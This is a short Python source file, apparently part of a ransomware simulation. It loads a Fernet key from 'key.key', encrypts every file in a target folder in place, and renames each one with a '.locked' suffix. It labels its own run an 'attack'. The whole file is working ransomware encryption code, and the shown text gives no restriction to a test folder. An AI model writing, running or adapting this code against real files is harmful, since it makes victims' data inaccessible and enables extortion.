from cryptography.fernet import Fernet
import os
import time


def load_key():
    return open("key.key", "rb").read()


def encrypt_files(folder, stop_flag):
    key = load_key()
    cipher = Fernet(key)

    count = 0

    try:
        files = os.listdir(folder)

    except Exception as e:
        print(f"[ENCRYPTOR ERROR] Unable to access folder: {e}")
        return 0

    for filename in files:

        if stop_flag["stop"]:
            print("🛑 Attack stopped!")
            break

        path = os.path.join(folder, filename)

        if not os.path.isfile(path) or filename.endswith(".locked"):
            continue

        try:
            with open(path, 'rb') as file:
                data = file.read()

            encrypted_data = cipher.encrypt(data)

            with open(path, 'wb') as file:
                file.write(encrypted_data)

            new_path = path + ".locked"
            os.rename(path, new_path)

            count += 1

            print(f"[ENCRYPTED] {filename}")

            time.sleep(1)

        except Exception as e:
            print(f"[ENCRYPT ERROR] Failed on {filename}: {e}")

    return count